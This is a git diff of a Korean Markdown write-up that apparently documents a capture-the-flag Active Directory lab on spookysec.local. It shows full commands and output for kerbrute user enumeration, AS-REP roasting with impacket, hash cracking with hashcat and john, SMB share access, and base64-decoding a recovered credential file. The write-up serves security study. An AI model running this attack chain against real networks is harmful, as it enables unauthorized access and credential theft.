@@ -293,49 +293,49 @@ t: 스레드 수 (동시 요청 수, 기본값은 10)
 
 kerbrute userenum --dc 10.10.206.91 -d spookysec.local -t 100 userlist.txt
 
-    __             __               __     
-   / /_____  _____/ /_  _______  __/ /____ 
-  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
- / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
-/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+    __             __               __
+
+/ /**\_** **\_**/ /\_ **\_\_\_** **/ /\_\_**
+/ //_/ _ \/ **\_/ ** \/ **\_/ / / / **/ _ \
+ / ,< / \_\_/ / / /_/ / / / /_/ / /_/ **/
+/_/|_|\_**/_/ /_.**_/_/ \__,_/\_\_/\_**/
 
 Version: dev (n/a) - 07/06/25 - Ronnie Flathers @ropnop
 
-2025/07/06 06:55:59 >  Using KDC(s):
-2025/07/06 06:55:59 >   10.10.206.91:88
+2025/07/06 06:55:59 > Using KDC(s):
+2025/07/06 06:55:59 > 10.10.206.91:88
 
-2025/07/06 06:55:59 >  [+] VALID USERNAME:       james@spookysec.local
-2025/07/06 06:56:00 >  [+] svc-admin has no pre auth required. Dumping hash to crack offline:
-$krb5asrep$18$svc-admin@SPOOKYSEC.LOCAL:eb7960f3000af4f080ea83a3bfcecf85$72c40a3cb926c5f8b3cc13cef014f763655df20a11bc61d3906484b260bda7671bf741abdc92c4f7b1c2bdaa56519a04890dc47f428075619a71ebae1bb8577199b14a9c9032fff2027e12d432e07f7ec2b764942855aeeaeafedd9347900404fd3e8c27b363d2380cb22803315fb27177d07535b38f1099eac31da01b94ace1e0f40009679329bba6e44a35dba35ab0edcd397ae6604fd0430182417d54bc99ed5141846d60249be0e2bd0153d69e6d12963e799dbf0ad6582e318e8d015b274e58af153c4ac5918c0235537720320d245fb927b222f9f47f41c1d4a08d4bc927081fc751c61f27e50f0167f171d0d4b42dc6aa159104c0d3ae404caeb12b646b1b7474cd98                                                                                                   
-2025/07/06 06:56:00 >  [+] VALID USERNAME:       svc-admin@spookysec.local
-2025/07/06 06:56:01 >  [+] VALID USERNAME:       James@spookysec.local
-2025/07/06 06:56:01 >  [+] VALID USERNAME:       robin@spookysec.local
-2025/07/06 06:56:04 >  [+] VALID USERNAME:       darkstar@spookysec.local
-2025/07/06 06:56:06 >  [+] VALID USERNAME:       administrator@spookysec.local
-2025/07/06 06:56:10 >  [+] VALID USERNAME:       backup@spookysec.local
-2025/07/06 06:56:11 >  [+] VALID USERNAME:       paradox@spookysec.local
-2025/07/06 06:56:21 >  [+] VALID USERNAME:       JAMES@spookysec.local
-2025/07/06 06:56:25 >  [+] VALID USERNAME:       Robin@spookysec.local
-2025/07/06 06:56:47 >  [+] VALID USERNAME:       Administrator@spookysec.local
-2025/07/06 06:57:30 >  [+] VALID USERNAME:       Darkstar@spookysec.local
-2025/07/06 06:57:44 >  [+] VALID USERNAME:       Paradox@spookysec.local
-2025/07/06 06:58:30 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
-2025/07/06 06:58:44 >  [+] VALID USERNAME:       ori@spookysec.local
-2025/07/06 06:59:09 >  [+] VALID USERNAME:       ROBIN@spookysec.local
-2025/07/06 07:00:12 >  Done! Tested 73317 usernames (16 valid) in 252.886 seconds
+2025/07/06 06:55:59 > [+] VALID USERNAME: james@spookysec.local
+2025/07/06 06:56:00 > [+] svc-admin has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$18$svc-admin@SPOOKYSEC.LOCAL:eb7960f3000af4f080ea83a3bfcecf85$72c40a3cb926c5f8b3cc13cef014f763655df20a11bc61d3906484b260bda7671bf741abdc92c4f7b1c2bdaa56519a04890dc47f428075619a71ebae1bb8577199b14a9c9032fff2027e12d432e07f7ec2b764942855aeeaeafedd9347900404fd3e8c27b363d2380cb22803315fb27177d07535b38f1099eac31da01b94ace1e0f40009679329bba6e44a35dba35ab0edcd397ae6604fd0430182417d54bc99ed5141846d60249be0e2bd0153d69e6d12963e799dbf0ad6582e318e8d015b274e58af153c4ac5918c0235537720320d245fb927b222f9f47f41c1d4a08d4bc927081fc751c61f27e50f0167f171d0d4b42dc6aa159104c0d3ae404caeb12b646b1b7474cd98  
+2025/07/06 06:56:00 > [+] VALID USERNAME: svc-admin@spookysec.local
+2025/07/06 06:56:01 > [+] VALID USERNAME: James@spookysec.local
+2025/07/06 06:56:01 > [+] VALID USERNAME: robin@spookysec.local
+2025/07/06 06:56:04 > [+] VALID USERNAME: darkstar@spookysec.local
+2025/07/06 06:56:06 > [+] VALID USERNAME: administrator@spookysec.local
+2025/07/06 06:56:10 > [+] VALID USERNAME: backup@spookysec.local
+2025/07/06 06:56:11 > [+] VALID USERNAME: paradox@spookysec.local
+2025/07/06 06:56:21 > [+] VALID USERNAME: JAMES@spookysec.local
+2025/07/06 06:56:25 > [+] VALID USERNAME: Robin@spookysec.local
+2025/07/06 06:56:47 > [+] VALID USERNAME: Administrator@spookysec.local
+2025/07/06 06:57:30 > [+] VALID USERNAME: Darkstar@spookysec.local
+2025/07/06 06:57:44 > [+] VALID USERNAME: Paradox@spookysec.local
+2025/07/06 06:58:30 > [+] VALID USERNAME: DARKSTAR@spookysec.local
+2025/07/06 06:58:44 > [+] VALID USERNAME: ori@spookysec.local
+2025/07/06 06:59:09 > [+] VALID USERNAME: ROBIN@spookysec.local
+2025/07/06 07:00:12 > Done! Tested 73317 usernames (16 valid) in 252.886 seconds
 
 # svc-admin 계정은 Pre-Auth가 필요하지 않으므로 AS-REP Roasting이 가능합니다. 이 계정의 해시를 오프라인에서 크랙할 수 있습니다.
 
 $krb5asrep$<etype>$<username>:<checksum>$<encrypted blob>
 
-| 항목                                 | 내용                             | 설명                                                  |
-| ---------------------------------- | ------------------------------ | --------------------------------------------------- |
-| `$krb5asrep$`                      | 고정 접두어                         | 해시 타입 식별자 (AS-REP Roasting용)                        |
+| 항목                               | 내용                                  | 설명                                                  |
+| ---------------------------------- | ------------------------------------- | ----------------------------------------------------- |
+| `$krb5asrep$`                      | 고정 접두어                           | 해시 타입 식별자 (AS-REP Roasting용)                  |
 | `18`                               | 암호화 알고리즘 (etype)               | `18 = aes256-cts-hmac-sha1-96`<br> → AES 256-bit 사용 |
-| `svc-admin@SPOOKYSEC.LOCAL`        | 사용자 Principal 이름               | 공격 대상 사용자                                           |
-| `eb7960f3000af4f080ea83a3bfcecf85` | 체크섬 (Checksum)                 | 티켓 데이터의 무결성 검사용 (크랙에는 필요 없음)                        |
-| `72c4...cd98`                      | 암호화된 데이터 (Encrypted Data Blob) | 실제로 크랙 대상이 되는 부분                                    |
-
+| `svc-admin@SPOOKYSEC.LOCAL`        | 사용자 Principal 이름                 | 공격 대상 사용자                                      |
+| `eb7960f3000af4f080ea83a3bfcecf85` | 체크섬 (Checksum)                     | 티켓 데이터의 무결성 검사용 (크랙에는 필요 없음)      |
+| `72c4...cd98`                      | 암호화된 데이터 (Encrypted Data Blob) | 실제로 크랙 대상이 되는 부분                          |
 
 # impacket 사용
 
@@ -354,6 +354,7 @@ python3 setup.py install
 cd impacket/examples
 
 # username 하나씩 넣어보면서 AS-REP Roasting 가능한지 확인
+
 python3 GetNPUsers.py spookysec.local/USERNAME -no-pass -dc-ip 10.10.206.91
 python3 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.206.91
 
@@ -364,18 +365,18 @@ python3 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.206.91
 ┌──(impacket-env)─(kali㉿vbox)-[~/impacket/examples]
 └─$ python3 GetNPUsers.py spookysec.local/svc-admin -no-pass
 /home/kali/impacket-env/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
-  import pkg_resources
-Impacket v0.13.0.dev0+20250702.182415.b33e994d - Copyright Fortra, LLC and its affiliated companies 
+import pkg_resources
+Impacket v0.13.0.dev0+20250702.182415.b33e994d - Copyright Fortra, LLC and its affiliated companies
 
 [*] Getting TGT for svc-admin
 $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:c5bdd5ab26d92c6f285bcc6d298177cc$90400cd95569b00649925f20b7462f510c4bf7928fc8704eee5c9add8febc9ad1cc4b63ad9aae1c2c66bc0fb5711d975ee4245cee843bb89cc04f0e7b1728e1ce84cb61feaaf8a7d5a5bdb83e1be7647fea8fb807e10228f25e424be86dec12edb634af6d4a08399fc921a0e062fa72de2095774ea0885ada3c5ca2392ec75f0606f53b181bcf03aae3d0efd337782322aa7c828445a7834402c0a931259e18010dccce3f54a04e40fb37fe6b5e7962ce9f4074f33a42d9a354079c3c8b07c0bef4fef7af65437b0b93bb0810bae9eb407cf962552dcef42e43688e6a5cb8544c3bc4ae854cfa1da1a14088ffae1fa1f7b1b
 
 $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:<암호화된 해시>
 
-
 # crack hash
 
 # 특이하게 해시 크랙시 해당 행 전체를 넣어야 합니다.
+
 # 예시: $krb5asrep$23$svc-admin@SPOOK~
 
 hashcat -m 18200 -a 0 -o cracked.txt --remove hashes.txt /usr/share/wordlists/rockyou.txt
@@ -383,16 +384,15 @@ hashcat -m 18200 -a 0 -o cracked.txt --remove hashes.txt /usr/share/wordlists/ro
 john 해시파일
 
 ┌──(impacket-env)─(kali㉿vbox)-[~]
-└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)     
+management2005 ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)  
 1g 0:00:00:00 DONE (2025-07-06 08:44) 50.00g/s 409600p/s 409600c/s 409600C/s newzealand..whitey
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
-
 
 # management2005 비밀번호 획득
 
@@ -416,7 +416,9 @@ smbclient -L spookysec.local -U svc-admin%management2005
 └─$ smbclient -L spookysec.local -U svc-admin%management2005
 
 Sharename Type Comment
---------- ---- -------
+
+---
+
 ADMIN$ Disk Remote Admin
 backup Disk
 C$ Disk Default share
@@ -427,4 +429,54 @@ Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to spookysec.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
 
+# 결과 분석
 
+| Sharename  | Type | 설명                                                   |
+| ---------- | ---- | ------------------------------------------------------ |
+| `ADMIN$`   | Disk | 관리자용 숨김 공유 (원격 관리용)                       |
+| `backup`   | Disk | 이름상 **중요한 데이터 저장소 가능성 있음** 🔥         |
+| `C$`       | Disk | 기본 시스템 드라이브 (숨김 공유)                       |
+| `IPC$`     | IPC  | 인터프로세스 통신용 파이프 (보통 익스플로잇 대상 아님) |
+| `NETLOGON` | Disk | 로그인 스크립트, GPO 관련 공유 (AD 환경에서 사용)      |
+| `SYSVOL`   | Disk | GPO, 스크립트 등 Group Policy 공유 (AD 구성 시 중요)   |
+
+# backup 공유에 접근 시도 성공
+
+┌──(root㉿docker-desktop)-[/]
+└─# smbclient \\\\spookysec.local\\backup -U svc-admin
+Password for [WORKGROUP\svc-admin]:
+Try "help" to get a list of possible commands.
+smb: \>
+
+# ls -> 백업 파일 확인
+
+smb: \>ls
+. D 0 Sat Apr 4 19:08:39 2020
+.. D 0 Sat Apr 4 19:08:39 2020
+backup_credentials.txt A 48 Sat Apr 4 19:08:53 2020
+
+    	8247551 blocks of size 4096. 3968429 blocks available
+
+smb: \>
+
+# get backup_credentials.txt -> 다운로드 크리덴셜 파일
+
+get backup_credentials.txt
+getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \>
+
+# 다운로드 확인
+
+┌──(root㉿docker-desktop)-[/]
+└─# ls
+backup_credentials.txt bin boot data dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var vpn
+
+┌──(root㉿docker-desktop)-[/]
+└─# cat backup_credentials.txt
+YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+
+# 크랙킹 -> base64
+
+┌──(root㉿docker-desktop)-[/]
+└─# echo YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw | base64 -d
+backup@spookysec.local:backup2517860
